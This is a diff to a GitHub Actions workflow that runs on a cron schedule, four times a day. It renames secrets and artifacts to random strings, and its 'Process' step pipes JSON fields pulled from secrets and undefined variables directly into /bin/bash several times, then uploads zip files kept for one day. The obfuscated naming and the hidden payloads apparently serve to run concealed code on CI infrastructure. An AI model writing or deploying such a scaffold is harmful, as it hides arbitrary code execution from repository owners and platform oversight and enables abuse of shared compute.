@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '21 1,7,13,19 * * *'
+    - cron: '6 1,7,13,19 * * *'
 env:
   CI: true
 concurrency:
@@ -19,15 +19,17 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          eq8: ${{ secrets.eq8 }}
+          hygxx27564: ${{ secrets.hygxx27564 }}
         run: |
-          printf '%s' "$eq8" | jq -r .hx65 | /bin/bash
-          printf '%s' "$vwoq340" | jq -r .dwwf3 | /bin/bash
-          echo $wnv7 | jq -r .ktdu75045 | /bin/bash
+          printf '%s' "$hygxx27564" | jq -r .u21090 | /bin/bash
+          echo $vee51 | jq -r .fl9010 | /bin/bash
+          printf '%s' "$dz3" | jq -r .dnpax09402 | /bin/bash
+          echo $irw15 | jq -r .pgts25 | /bin/bash
+          printf '%s' "$bkql284" | jq -r .sn65 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: NzSRzlaS
+          name: L80QcNJr
           path: "*.zip"
           retention-days: 1
